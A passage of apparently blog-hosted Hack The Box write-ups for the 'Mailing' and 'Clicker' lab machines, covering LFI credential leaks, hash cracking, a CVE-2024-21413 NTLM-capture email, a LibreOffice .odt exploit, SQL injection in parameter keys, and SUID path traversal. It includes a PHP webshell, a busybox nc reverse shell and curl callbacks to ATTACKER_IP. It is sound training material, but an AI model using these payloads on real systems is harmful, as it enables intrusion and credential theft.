      "body": "<h1 id=\"mailing-hack-the-box\">Mailing // Hack The Box</h1>\n<table>\n<thead>\n<tr>\n<th>Info</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>OS</td>\n<td>Windows</td>\n</tr>\n<tr>\n<td>Difficulty</td>\n<td>Easy</td>\n</tr>\n<tr>\n<td>IP</td>\n<td>10.129.232.39</td>\n</tr>\n<tr>\n<td>Hostname</td>\n<td>mailing.htb</td>\n</tr>\n<tr>\n<td>Services</td>\n<td>SMTP/hMailServer (25,465,587), HTTP/IIS (80), POP3 (110), IMAP (143,993), SMB (445), WinRM (5985)</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"enumeration\">Enumeration</h2>\n<h3 id=\"nmap\">Nmap</h3>\n<pre><code class=\"language-bash\">nmap -sC -sV -p- -vvv -oA scan/nmap.scan mailing.htb\n</code></pre>\n<pre><code class=\"language-text\">PORT      STATE SERVICE       VERSION\n25/tcp    open  smtp          hMailServer smtpd\n| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP\n110/tcp   open  pop3          hMailServer pop3d\n|_pop3-capabilities: USER TOP UIDL\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-title: Did not follow redirect to http://mailing.htb\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n143/tcp   open  imap          hMailServer imapd\n|_imap-capabilities: IMAP4rev1 IDLE NAMESPACE SORT QUOTA ACL CHILDREN\n445/tcp   open  microsoft-ds?\n465/tcp   open  ssl/smtp      hMailServer smtpd\n587/tcp   open  smtp          hMailServer smtpd\n| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP\n993/tcp   open  ssl/imap      hMailServer imapd\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n</code></pre>\n<blockquote>\n<p><strong>Info from SSL certificate</strong><br>\nThe certificate on port 465/587/993 reveals:\n- <strong>CN:</strong> mailing.htb\n- <strong>Email:</strong> <code>ruy@mailing.htb</code> — first user found\n- <strong>Org:</strong> Mailing Ltd, Madrid, Spain</p>\n</blockquote>\n<p>SMB signing not required:</p>\n<pre><code class=\"language-text\">| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled but not required\n</code></pre>\n<h3 id=\"directory-bruteforce\">Directory Bruteforce</h3>\n<pre><code class=\"language-bash\">feroxbuster -u http://mailing.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x js,html,php,txt,json,docx -o scan/root.dir\n</code></pre>\n<p>Relevant results:</p>\n<table>\n<thead>\n<tr>\n<th>Status</th>\n<th>Path</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>200</td>\n<td><code>/download.php</code></td>\n</tr>\n<tr>\n<td>200</td>\n<td><code>/index.php</code></td>\n</tr>\n<tr>\n<td>301</td>\n<td><code>/assets/</code></td>\n</tr>\n<tr>\n<td>301</td>\n<td><code>/instructions/</code></td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"web-application-instructionspdf\">Web Application // instructions.pdf</h3>\n<p>The <code>/instructions/</code> directory contains a PDF: <code>instructions.pdf</code> — guide to configure mail clients (Windows Mail, Thunderbird) to connect to <code>mailing.htb</code>.</p>\n<blockquote>\n<p><strong>Info from PDF</strong><br>\n- Confirms users: <code>maya@mailing.htb</code> (recipient in demos), <code>ruy@mailing.htb</code> (from SSL certificate)\n- Clients on the machine use <strong>Windows Mail</strong> and/or <strong>Thunderbird</strong> (with <strong>Outlook</strong> as viewer — relevant for CVE)\n- Mail server: IMAP4 on <code>mailing.htb</code>, SMTP on <code>mailing.htb</code></p>\n</blockquote>\n<hr>\n<h2 id=\"foothold\">Foothold</h2>\n<h3 id=\"lfi-on-downloadphp-leak-hmailserverini\">LFI on download.php // Leak hMailServer.INI</h3>\n<blockquote>\n<p>See also: WebServices and MailServer</p>\n</blockquote>\n<p>The <code>file</code> parameter in <code>download.php</code> is vulnerable to <strong>path traversal</strong> with backslash (Windows):</p>\n<p><img alt=\"LFI.png\" src=\"img/LFI.png\"></p>\n<pre><code class=\"language-bash\">curl --path-as-is -i -s -k -X 'GET' \\\n  'http://mailing.htb/download.php?file=..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Program%20Files%20(x86)%2fhMailServer%2fBin%2fhMailServer%2eINI'\n</code></pre>\n<pre><code class=\"language-text\">HTTP/1.1 200 OK\nContent-Type: application/octet-stream\nServer: Microsoft-IIS/10.0\nX-Powered-By: PHP/8.3.3\nContent-Disposition: attachment; filename=&quot;hMailServer.INI&quot;\n</code></pre>\n<pre><code class=\"language-ini\">[Directories]\nProgramFolder=C:\\Program Files (x86)\\hMailServer\nDatabaseFolder=C:\\Program Files (x86)\\hMailServer\\Database\nDataFolder=C:\\Program Files (x86)\\hMailServer\\Data\nLogFolder=C:\\Program Files (x86)\\hMailServer\\Logs\nTempFolder=C:\\Program Files (x86)\\hMailServer\\Temp\nEventFolder=C:\\Program Files (x86)\\hMailServer\\Events\n\n[GUILanguages]\nValidLanguages=english,swedish\n\n[Security]\nAdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7\n\n[Database]\nType=MSSQLCE\nUsername=\nPassword=0a9f8ad8bf896b501dde74f08efd7e4c\nPasswordEncryption=1\nPort=0\nServer=\nDatabase=hMailServer\nInternal=1\n</code></pre>\n<blockquote>\n<p><strong>Credentials found</strong><br>\n- <strong>AdministratorPassword:</strong> <code>841bb5acfa6779ae432fd7a4e6600ba7</code> (MD5)\n- <strong>Database Password:</strong> <code>0a9f8ad8bf896b501dde74f08efd7e4c</code></p>\n</blockquote>\n<p>The MD5 hash of the admin is easily cracked:</p>\n<pre><code class=\"language-bash\">hashcat -m 0 841bb5acfa6779ae432fd7a4e6600ba7 /usr/share/wordlists/rockyou.txt\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>Hash</th>\n<th>Password</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>841bb5acfa6779ae432fd7a4e6600ba7</code></td>\n<td><code>homenetworkingadministrator</code></td>\n</tr>\n</tbody>\n</table>\n<p>SMTP Credentials: <code>administrator@mailing.htb</code> : <code>homenetworkingadministrator</code></p>\n<h3 id=\"cve-2024-21413-monikerlink-outlook-ntlm-leak\">CVE-2024-21413 // MonikerLink (Outlook NTLM Leak)</h3>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>CVE-2024-21413</strong> — Microsoft Outlook Remote Code Execution via MonikerLink. Allows sending an email containing a link to an SMB share (<code>\\\\attacker\\share</code>) that forces the Outlook client to authenticate via NTLM <strong>without user interaction</strong> (zero-click). The NTLMv2 hash is captured by the attacker.</p>\n<p>Ref: https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability</p>\n</blockquote>\n<h4 id=\"step-1-start-responder\">Step 1 // Start Responder</h4>\n<pre><code class=\"language-bash\">sudo responder -I tun0 -wv\n</code></pre>\n<h4 id=\"step-2-send-the-malicious-email\">Step 2 // Send the malicious email</h4>\n<pre><code class=\"language-bash\">python3 CVE-2024-21413.py \\\n  --server mailing.htb \\\n  --port 587 \\\n  --username 'administrator@mailing.htb' \\\n  --password 'homenetworkingadministrator' \\\n  --sender 'administrator@mailing.htb' \\\n  --recipient 'maya@mailing.htb' \\\n  --url '\\\\&lt;ATTACKER_IP&gt;\\tmp\\test.txt' \\\n  --subject Test\n</code></pre>\n<p>The email is sent via port 587 (SMTP Submission with auth). Maya opens the email in Outlook → the client attempts to access the SMB share → Responder captures the NTLMv2 hash.</p>\n<h4 id=\"step-3-capture-ntlmv2\">Step 3 // Capture NTLMv2</h4>\n<pre><code class=\"language-text\">[SMB] NTLMv2-SSP Client   : 10.129.232.39\n[SMB] NTLMv2-SSP Username : MAILING\\maya\n[SMB] NTLMv2-SSP Hash     : maya::MAILING:85267b37d940ab5a:67A589D74C2805844383A831FE65117B:0101000000000000801A628F37A4DC01...\n</code></pre>\n<hr>\n<h2 id=\"user\">User</h2>\n<h3 id=\"cracking-ntlmv2\">Cracking NTLMv2</h3>\n<pre><code class=\"language-bash\">hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 5600\n</code></pre>\n<pre><code class=\"language-text\">MAYA::MAILING:...:m4y4ngs4ri\n\nStatus...........: Cracked\nHash.Mode........: 5600 (NetNTLMv2)\nTime.Started.....: Sun Feb 22 20:13:39 2026 (0 secs)\nSpeed.#*.........: 32681.3 kH/s\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>Username</th>\n<th>Password</th>\n<th>Domain</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>maya</code></td>\n<td><code>m4y4ngs4ri</code></td>\n<td><code>MAILING</code></td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"winrm-shell-as-maya\">WinRM // Shell as maya</h3>\n<pre><code class=\"language-bash\">evil-winrm -i mailing.htb -u maya -p 'm4y4ngs4ri'\n</code></pre>\n<pre><code class=\"language-text\">*Evil-WinRM* PS C:\\Users\\maya\\Documents&gt; ls\n\n    Directory: C:\\Users\\maya\\Documents\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----         3/13/2024   4:49 PM                WindowsPowerShell\n-a----         3/22/2025   4:25 PM           2257 mail.py\n</code></pre>\n<p>User flag in <code>C:\\Users\\maya\\Desktop\\user.txt</code>.</p>\n<hr>\n<h2 id=\"privilege-escalation\">Privilege Escalation</h2>\n<blockquote>\n<p>See also: PrivilegeEscalationWindows</p>\n</blockquote>\n<h3 id=\"cve-2023-2255-libreoffice-rce-via-odt\">CVE-2023-2255 // LibreOffice RCE via .odt</h3>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>CVE-2023-2255</strong> — LibreOffice &lt; 24.2.4 allows arbitrary command execution via a malicious <code>.odt</code> file exploiting Floating Frames. A specially crafted <code>.odt</code> file executes commands when opened.</p>\n<p>Ref: https://github.com/elweth-sec/CVE-2023-2255</p>\n</blockquote>\n<p>The machine has <strong>LibreOffice 7.4</strong> installed, vulnerable to the CVE.</p>\n<blockquote>\n<p><strong>Note</strong><br>\nYou also need to download the <code>samples/</code> folder from the exploit repository to generate the <code>.odt</code> file.</p>\n</blockquote>\n<h4 id=\"step-1-test-rce-with-callback\">Step 1 // Test RCE with callback</h4>\n<p>Generate a test <code>.odt</code> to verify execution:</p>\n<pre><code class=\"language-bash\">python3 CVE-2023-2255.py --cmd 'curl http://&lt;ATTACKER_IP&gt;:80/mario' --output 'exploit.odt'\n</code></pre>\n<p>Upload to the target machine in the directory <code>C:\\Important Documents\\</code> (monitored by a task that automatically opens documents):</p>\n<pre><code class=\"language-powershell\">*Evil-WinRM* PS C:\\Important Documents&gt; upload exploit.odt\n</code></pre>\n<p>After a few seconds, you receive the HTTP callback → <strong>RCE confirmed</strong>.</p>\n<h4 id=\"step-2-add-maya-to-the-administrators-group\">Step 2 // Add maya to the Administrators group</h4>\n<blockquote>\n<p><strong>Spanish locale</strong><br>\nThe machine is in <strong>Spanish</strong> — the Administrators group is named <code>Administradores</code>.</p>\n</blockquote>\n<pre><code class=\"language-bash\">python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'\n</code></pre>\n<pre><code class=\"language-powershell\">*Evil-WinRM* PS C:\\Important Documents&gt; upload exploit.odt\n</code></pre>\n<h4 id=\"step-3-access-as-admin\">Step 3 // Access as admin</h4>\n<p>After logout and new login with evil-winrm, maya is in the <code>Administradores</code> group and can access other users' directories:</p>\n<pre><code class=\"language-text\">*Evil-WinRM* PS C:\\Users\\localadmin&gt; ls\n\n    Directory: C:\\Users\\localadmin\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-r---         3/13/2024   4:49 PM                3D Objects\nd-r---         3/13/2024   4:49 PM                Contacts\nd-r---          4/4/2024   2:06 PM                Desktop\nd-r---         3/13/2024   4:49 PM                Documents\nd-r---         3/13/2024   4:49 PM                Downloads\nd-r---         3/13/2024   4:49 PM                Favorites\nd-r---         3/13/2024   4:49 PM                Links\nd-r---         3/13/2024   4:49 PM                Music\nd-r---         3/13/2024   4:49 PM                Pictures\nd-r---         3/13/2024   4:49 PM                Saved Games\nd-r---         3/13/2024   4:49 PM                Searches\nd-r---         3/13/2024   4:49 PM                Videos\n</code></pre>\n<p>Root flag in <code>C:\\Users\\localadmin\\Desktop\\root.txt</code>.</p>\n<hr>\n<h2 id=\"attack-chain-summary\">Attack Chain Summary</h2>\n<pre><code class=\"language-text\">Web enum → /instructions/instructions.pdf → users: maya, ruy\n    │\n    ↓\nLFI (download.php?file=..\\..\\..) → hMailServer.INI\n    │  AdministratorPassword MD5 → homenetworkingadministrator\n    ↓\nCVE-2024-21413 (MonikerLink) → mail to maya with SMB link\n    │  Responder captures NTLMv2 hash of maya\n    ↓\nhashcat -m 5600 → m4y4ngs4ri\n    │\n    ↓\nevil-winrm maya@mailing.htb → user flag\n    │\n    ↓\nCVE-2023-2255 (LibreOffice .odt) → RCE\n    │  net localgroup Administradores maya /add\n    ↓\nmaya admin → C:\\Users\\localadmin\\Desktop\\root.txt\n</code></pre>"
    },
    {
      "title": "Clicker",
      "slug": "clicker",
      "date": "2026·02·18",
      "tags": [
        "htb",
        "medium",
        "linux",
        "nfs",
        "php",
        "sql-injection"
      ],
      "desc": "Key ports: - 22/tcp — OpenSSH 8.9p1 Ubuntu - 80/tcp — Apache 2.4.52 → redirect to http://clicker.htb/ - 111/tcp — rpcbind → indicates NFS active - 2049/tcp — NFS",
      "body": "<h1 id=\"clicker-hack-the-box\">Clicker // Hack The Box</h1>\n<table>\n<thead>\n<tr>\n<th>Info</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>OS</td>\n<td>Linux</td>\n</tr>\n<tr>\n<td>Difficulty</td>\n<td>Medium</td>\n</tr>\n<tr>\n<td>IP</td>\n<td>10.129.1.19</td>\n</tr>\n<tr>\n<td>Hostname</td>\n<td>clicker.htb</td>\n</tr>\n<tr>\n<td>Services</td>\n<td>SSH (22), HTTP/Apache (80), RPC (111), NFS (2049)</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"enumeration\">Enumeration</h2>\n<h3 id=\"nmap\">Nmap</h3>\n<pre><code class=\"language-bash\">nmap -sC -sV -p- -vvv -oA scan/nmap.scan clicker.htb\n</code></pre>\n<pre><code class=\"language-text\">PORT      STATE SERVICE  VERSION\n22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4\n80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))\n|_http-title: Did not follow redirect to http://clicker.htb/\n111/tcp   open  rpcbind  2-4 (RPC #100000)\n| rpcinfo:\n|   100003  3,4  2049/tcp  nfs\n|   100005  1,2,3  60343/tcp  mountd\n|   100227  3  2049/tcp  nfs_acl\n2049/tcp  open  nfs_acl  3 (RPC #100227)\n</code></pre>\n<p>Key ports:\n- <strong>22/tcp</strong> — OpenSSH 8.9p1 Ubuntu\n- <strong>80/tcp</strong> — Apache 2.4.52 → redirect to <code>http://clicker.htb/</code>\n- <strong>111/tcp</strong> — rpcbind → indicates <strong>NFS</strong> active\n- <strong>2049/tcp</strong> — NFS</p>\n<h3 id=\"nfs-share-enumeration\">NFS // Share Enumeration</h3>\n<blockquote>\n<p>See also: NFS for the full checklist</p>\n</blockquote>\n<pre><code class=\"language-bash\">showmount -e clicker.htb\n</code></pre>\n<pre><code class=\"language-text\">Export list for clicker.htb:\n/mnt/backups *\n</code></pre>\n<p>Share <code>/mnt/backups</code> exported to all (<code>*</code>). Mount:</p>\n<pre><code class=\"language-bash\">sudo mount -t nfs clicker.htb:/mnt/backups /mnt\n</code></pre>\n<p>Contents: a single file <code>clicker.htb_backup.zip</code> (PHP source code backup).</p>\n<pre><code class=\"language-bash\">cp /mnt/clicker.htb_backup.zip .\nunzip clicker.htb_backup.zip\n</code></pre>\n<h3 id=\"source-code-review\">Source Code Review</h3>\n<p>Files extracted from the PHP webapp:</p>\n<table>\n<thead>\n<tr>\n<th>File</th>\n<th>Function</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>index.php</code></td>\n<td>Homepage</td>\n</tr>\n<tr>\n<td><code>login.php</code> / <code>register.php</code></td>\n<td>Authentication</td>\n</tr>\n<tr>\n<td><code>authenticate.php</code></td>\n<td>Login logic</td>\n</tr>\n<tr>\n<td><code>create_player.php</code></td>\n<td>User registration</td>\n</tr>\n<tr>\n<td><code>db_utils.php</code></td>\n<td>DB connection and queries</td>\n</tr>\n<tr>\n<td><code>play.php</code></td>\n<td>Game (clicker)</td>\n</tr>\n<tr>\n<td><code>save_game.php</code></td>\n<td>Save score</td>\n</tr>\n<tr>\n<td><code>profile.php</code></td>\n<td>User profile</td>\n</tr>\n<tr>\n<td><code>admin.php</code></td>\n<td>Admin panel</td>\n</tr>\n<tr>\n<td><code>export.php</code></td>\n<td>Data export</td>\n</tr>\n<tr>\n<td><code>diagnostic.php</code></td>\n<td>Diagnostics</td>\n</tr>\n<tr>\n<td><code>info.php</code></td>\n<td>phpinfo</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"code-analysis-sql-injection-in-parameter-keys\">Code Analysis // SQL Injection in parameter keys</h3>\n<blockquote>\n<p>See also: SQLInjection and Database</p>\n<p><strong>Vulnerability</strong><br>\n<strong>Mass Assignment + SQL Injection in GET parameter names.</strong> The file <code>save_game.php</code> accepts arbitrary GET parameters and passes them to <code>save_profile()</code> in <code>db_utils.php</code>, which concatenates the <strong>keys</strong> directly into the SQL query without sanitization. Only the <strong>values</strong> are protected by <code>$pdo-&gt;quote()</code>.</p>\n</blockquote>\n<h4 id=\"the-vulnerable-flow\">The vulnerable flow</h4>\n<p><strong><code>save_game.php</code></strong> — iterates over GET parameters and only blocks the exact key <code>role</code>:</p>\n<pre><code class=\"language-php\">foreach($_GET as $key=&gt;$value) {\n    if (strtolower($key) === 'role') {  // weak filter\n        header('Location: /index.php?err=Malicious activity detected!');\n        die;\n    }\n    $args[$key] = $value;\n}\nsave_profile($_SESSION['PLAYER'], $_GET);\n</code></pre>\n<p><strong><code>db_utils.php:save_profile()</code></strong> — builds the query by concatenating keys without quoting:</p>\n<pre><code class=\"language-php\">function save_profile($player, $args) {\n    foreach ($args as $key =&gt; $value) {\n        $setStr .= $key . &quot;=&quot; . $pdo-&gt;quote($value) . &quot;,&quot;;\n        //          ^^^                ^^^^^^^^^^^^\n        //       NOT quoted             quoted (safe)\n    }\n    $stmt = $pdo-&gt;prepare(&quot;UPDATE players SET $setStr WHERE username = :player&quot;);\n}\n</code></pre>\n<h4 id=\"bypassing-the-role-filter\">Bypassing the \"role\" filter</h4>\n<p>The check <code>strtolower($key) === 'role'</code> compares the exact string. But with a newline URL-encoded (<code>%0a</code>) the filter doesn't trigger:</p>\n<pre><code class=\"language-text\">GET /save_game.php?clicks=10&amp;level=1&amp;role%0a=Admin\n</code></pre>\n<p><code>strtolower(\"role\\n\")</code> → <code>\"role\\n\"</code> ≠ <code>\"role\"</code> — the filter passes. The generated query:</p>\n<pre><code class=\"language-sql\">UPDATE players SET clicks='10', level='1', role\n='Admin' WHERE username = 'user'\n</code></pre>\n<p>MySQL accepts the newline in the column name — the role becomes <code>Admin</code>.</p>\n<h4 id=\"alternative-bypass-injection-in-the-key\">Alternative bypass // injection in the key</h4>\n<p>Normal save (without injection):</p>\n<pre><code class=\"language-text\">GET /save_game.php?clicks=4&amp;level=0\n</code></pre>\n<pre><code class=\"language-sql\">UPDATE players SET clicks='4',level='0' WHERE username = &quot;sverz1&quot;;\n</code></pre>\n<p>With injection in the key — injecting <code>role='Admin',</code> as part of the parameter name:</p>\n<pre><code class=\"language-text\">GET /save_game.php?role='Admin',clicks=4&amp;level=0\n</code></pre>\n<p>The parameter <code>role='Admin',clicks</code> has the value <code>4</code>. In query construction, the key is concatenated directly:</p>\n<ul>\n<li>Key: <code>role='Admin',clicks</code> → Value: <code>4</code> → produces <code>role='Admin',clicks='4'</code></li>\n<li>Key: <code>level</code> → Value: <code>0</code> → produces <code>level='0'</code></li>\n</ul>\n<p>The filter doesn't trigger because the key is <code>role='Admin',clicks</code>, not <code>role</code>. Resulting query:</p>\n<pre><code class=\"language-sql\">UPDATE players SET role='Admin',clicks='4',level='0' WHERE username = &quot;sverz1&quot;;\n</code></pre>\n<h4 id=\"admin-access\">Admin access</h4>\n<p>After changing the role, logout and login. <code>authenticate.php</code> loads the role from the DB into the session:</p>\n<pre><code class=\"language-php\">$_SESSION[&quot;ROLE&quot;] = $profile[&quot;role&quot;];  // now &quot;Admin&quot;\n</code></pre>\n<p>Access to the <code>admin.php</code> panel obtained.</p>\n<hr>\n<h2 id=\"foothold\">Foothold</h2>\n<h3 id=\"elevazione-a-admin-sqli-with-3d-encoding\">Elevazione a Admin // SQLi with <code>%3d</code> encoding</h3>\n<p>Using Burp, intercept the save request and inject <code>role='Admin'</code> into the parameter key. The <code>%3d</code> and URL-encoding, so the key becomes <code>role='Admin',clicks</code>:</p>\n<pre><code class=\"language-http\">GET /save_game.php?role%3d'Admin',clicks=1&amp;level=0 HTTP/1.1\nHost: www.clicker.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0\nReferer: http://www.clicker.htb/play.php\nCookie: PHPSESSID=3piqjsj214a0ipha3ejp3vtvle\n</code></pre>\n<pre><code class=\"language-http\">HTTP/1.1 302 Found\nLocation: /index.php?msg=Game has been saved!\n</code></pre>\n<p>Response 302 — the game is saved without errors. After logout and login, the menu shows <strong>Administration</strong>.</p>\n<h3 id=\"rce-via-php-export-webshell-in-nickname\">RCE via PHP export // webshell in nickname</h3>\n<p>With admin access, the <code>admin.php</code> panel shows the top players leaderboard and an <strong>Export</strong> function that creates a file on the server.</p>\n<h4 id=\"the-vulnerable-source-code\">The vulnerable source code</h4>\n<p><strong><code>export.php</code></strong> — accepts <code>threshold</code> and <code>extension</code> via POST, creates a file on the filesystem:</p>\n<pre><code class=\"language-php\">// export.php (key lines)\n$threshold = 1000000;\nif (isset($_POST[&quot;threshold&quot;]) &amp;&amp; is_numeric($_POST[&quot;threshold&quot;])) {\n    $threshold = $_POST[&quot;threshold&quot;];\n}\n$data = get_top_players($threshold);\n$currentplayer = get_current_player($_SESSION[&quot;PLAYER&quot;]);\n\n// The player's nickname is inserted WITHOUT escaping:\n$s .= '&lt;th scope=&quot;row&quot;&gt;' . $currentplayer[&quot;nickname&quot;] . '&lt;/th&gt;';\n//                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n//                          if nickname contains PHP, it is written as-is\n\n// The filename uses the extension from POST WITHOUT whitelist:\n$filename = &quot;exports/top_players_&quot; . random_string(8) . &quot;.&quot; . $_POST[&quot;extension&quot;];\n//                                                              ^^^^^^^^^^^^^^^^\n//                                                              no validation\nfile_put_contents($filename, $s);\n</code></pre>\n<blockquote>\n<p><strong>Two problems in one file</strong><br>\n1. <strong>No escaping on nickname</strong> — the <code>nickname</code> field from the DB is concatenated directly into the HTML/file. If it contains PHP code, it is written to the file.\n2. <strong>No whitelist on extension</strong> — the dropdown shows <code>txt</code>, <code>html</code>, <code>json</code>, but the POST value is used directly. Changing it to <code>php</code>, the generated file becomes executable by Apache.</p>\n</blockquote>\n<p><strong><code>db_utils.php:save_profile()</code></strong> — allows writing arbitrary <code>nickname</code> via the same SQLi in the keys:</p>\n<pre><code class=\"language-php\">function save_profile($player, $args) {\n    global $pdo;\n    $params = [&quot;player&quot;=&gt;$player];\n    $setStr = &quot;&quot;;\n    foreach ($args as $key =&gt; $value) {\n        $setStr .= $key . &quot;=&quot; . $pdo-&gt;quote($value) . &quot;,&quot;;\n        //          ^^^   key NOT sanitized\n    }\n    $setStr = rtrim($setStr, &quot;,&quot;);\n    $stmt = $pdo-&gt;prepare(&quot;UPDATE players SET $setStr WHERE username = :player&quot;);\n    $stmt -&gt; execute($params);\n}\n</code></pre>\n<p>The <code>nickname</code> field and a legitimate column of the <code>players</code> table — no injection in the keys needed, just pass it as a normal GET parameter.</p>\n<h4 id=\"step-1-inject-php-into-nickname\">Step 1 // Inject PHP into nickname</h4>\n<pre><code class=\"language-text\">GET /save_game.php?clicks=8&amp;level=0&amp;nickname=&lt;?php+system($_REQUEST['cmd']);?&gt;\n</code></pre>\n<p>The <code>nickname</code> in the DB becomes <code>&lt;?php system($_REQUEST['cmd']); ?&gt;</code>. The value is protected by <code>$pdo-&gt;quote()</code>, but it doesn't matter — it is written correctly to the DB as a string.</p>\n<h4 id=\"step-2-export-as-php\">Step 2 // Export as <code>.php</code></h4>\n<p>Intercept the export request with Burp and change the <code>extension</code> parameter:</p>\n<pre><code class=\"language-text\">POST /export.php\nthreshold=0&amp;extension=php\n</code></pre>\n<p>The server responds with the path: <code>exports/top_players_d2sfmod2.php</code>. The file contains the nickname with the PHP code.</p>\n<h4 id=\"step-3-rce-and-reverse-shell\">Step 3 // RCE and reverse shell</h4>\n<pre><code class=\"language-http\">GET /exports/top_players_d2sfmod2.php?cmd=busybox+nc+&lt;ATTACKER_IP&gt;+80+-e+/bin/bash HTTP/1.1\nHost: www.clicker.htb\nCookie: PHPSESSID=3piqjsj214a0ipha3ejp3vtvle\n</code></pre>\n<pre><code class=\"language-bash\"># Listener on the attacker\nnc -lvnp 80\n</code></pre>\n<p>Shell obtained as <code>www-data</code>.</p>\n<hr>\n<h2 id=\"user\">User</h2>\n<h3 id=\"suid-binary-path-traversal-on-execute_query\">SUID binary // Path Traversal on <code>execute_query</code></h3>\n<p>SUID enumeration:</p>\n<pre><code class=\"language-bash\">find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre>\n<p>The binary <code>/opt/manage/execute_query</code> is non-standard. It has the <strong>SUID/SGID</strong> bit set for user <code>jack</code> (UID 1000).</p>\n<h4 id=\"readme\">README</h4>\n<p><code>README.txt</code> in the same directory:</p>\n<pre><code class=\"language-text\">Web application Management\nUse the binary to execute the following task:\n    - 1: Creates the database structure and adds user admin\n    - 2: Creates fake players (better not tell anyone)\n    - 3: Resets the admin password\n    - 4: Deletes all users except the admin\n</code></pre>\n<h4 id=\"reverse-engineering-with-ghidra\">Reverse engineering with Ghidra</h4>\n<p><img alt=\"reversedexecutequery.png\" src=\"img/reversedexecutequery.png\"></p>\n<p>The decompiled code reveals the full flow:</p>\n<pre><code class=\"language-c\">// 1. Converts the first argument (argv[1]) to an integer\niVar1 = atoi(*(char **)(param_2 + 8));\npcVar3 = (char *)calloc(0x14, 1);\n\n// 2. Switch: cases 1-4 use predefined files\nswitch(iVar1) {\n    case 0:  puts(&quot;ERROR: Invalid arguments&quot;); goto exit;\n    case 1:  strncpy(pcVar3, &quot;create.sql&quot;, 0x14);         break;\n    case 2:  strncpy(pcVar3, &quot;populate.sql&quot;, 0x14);        break;\n    case 3:  strncpy(pcVar3, &quot;reset_password.sql&quot;, 0x14);  break;\n    case 4:  strncpy(pcVar3, &quot;clean.sql&quot;, 0x14);           break;\n    default:\n        // VULNERABILITY: copies argv[2] directly, without validation\n        strncpy(pcVar3, *(char **)(param_2 + 0x10), 0x14);\n}\n\n// 3. Builds the path: &quot;/home/jack/queries/&quot; + filename\nbuiltin_strncpy(local_98, &quot;/home/jack/queries/&quot;, 0x14);\n__dest = (char *)calloc(sVar5 + sVar4 + 1, 1);\nstrcat(__dest, local_98);   // &quot;/home/jack/queries/&quot;\nstrcat(__dest, pcVar3);     // + &quot;../.ssh/id_rsa&quot; ← path traversal\n\n// 4. Sets UID to jack (1000) — the SUID bit comes into play here\nsetreuid(1000, 1000);\n\n// 5. Checks if the file is readable (as jack, not as www-data)\niVar1 = access(__dest, 4);  // R_OK = 4\n\nif (iVar1 == 0) {\n    // 6. Executes: mysql ... -v &lt; /home/jack/queries/../.ssh/id_rsa\n    strcat(pcVar3, &quot;/usr/bin/mysql -u clicker_db_user &quot;\n                   &quot;--password='clicker_db_password' clicker -v &lt; &quot;);\n    strcat(pcVar3, __dest);\n    system(pcVar3);   // output contains the file content\n}\n</code></pre>\n<blockquote>\n<p><strong>Three issues in the binary</strong><br>\n1. <strong>No path validation</strong> — the <code>default</code> case copies <code>argv[2]</code> as-is. Presence of <code>../</code> or absolute paths is not verified.\n2. <strong><code>setreuid(1000, 1000)</code></strong> — the binary sets UID/GID to <code>jack</code> before the <code>access()</code> check. Any file readable by jack is accessible.\n3. <strong><code>system()</code> with user input</strong> — the user-controlled path is passed to <code>system()</code> as part of the command. MySQL attempts to interpret the file as SQL, but still prints the content in output (<code>-v</code>).</p>\n</blockquote>\n<h4 id=\"extracting-jacks-ssh-key\">Extracting jack's SSH key</h4>\n<pre><code class=\"language-text\">www-data@clicker:/opt/manage$ ./execute_query 5 ../.ssh/id_rsa\nmysql: [Warning] Using a password on the command line interface can be insecure.\n--------------\n-----BEGIN OPENSSH PRIVATE KEY---\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAs4eQaWHe45iGSieDHbraAYgQdMwlMGPt50KmMUAvWgAV2zlP8/1Y\n...\nlL4gSjpD/FjWk9AAAADGphY2tAY2xpY2tlcgECAwQFBg==\n-----END OPENSSH PRIVATE KEY---\n</code></pre>\n<p>The binary runs as <code>jack</code> (SUID) → can read <code>/home/jack/.ssh/id_rsa</code>. The MySQL warning is normal — the binary passes the key as if it were an SQL query, but the output still contains the full key.</p>\n<blockquote>\n<p><strong>Note</strong><br>\nThe action <code>5</code> does not match any predefined case (1-4), so the binary 